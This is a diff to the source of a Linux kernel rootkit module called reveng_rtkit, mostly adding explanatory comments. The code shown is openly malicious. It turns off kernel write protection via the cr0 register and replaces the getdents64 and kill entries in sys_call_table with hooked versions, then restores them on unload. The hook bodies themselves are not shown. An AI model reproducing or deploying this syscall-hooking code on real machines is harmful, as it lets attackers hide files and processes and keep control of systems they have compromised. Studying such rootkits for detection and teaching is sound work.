@@ -297,9 +297,10 @@ static int __init rootkit_init(void)
 	if (!__sys_call_table)
 		return -1;
 
-	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: %p\n", __sys_call_table);
+	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);
 
-	/* Executes the instruction to read cr0 register
+
+	/* Executes the instruction to read cr0 register (via inline assembly) and returns the result in a general-purpose register.
 	 *
 	 * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
 	 *
@@ -307,16 +308,24 @@ static int __init rootkit_init(void)
 	 */
 	cr0 = read_cr0();
 
+	// Storing original syscall
 	orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
 	orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
 
+	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
+
 	unprotect_memory();
 
+	// Editing syscall table targeting "getdents64" and "kill" syscall with our created "hacked_getdents64" and "hacked_kill".
 	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
+	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
+
 	protect_memory();
 	
+	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
+
 	// =====================================================================================
 
 	/* Dynamically allocating Major number*/
@@ -419,6 +428,7 @@ static void __exit rootkit_exit(void)
 	unprotect_memory();
 	printk(KERN_INFO "\t\t\t\t\t\t back to normal");
 
+	// Editing the sycall table back to normal, i.e. with original syscalls: "getdents64" and "kill" syscalls.
 	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
 
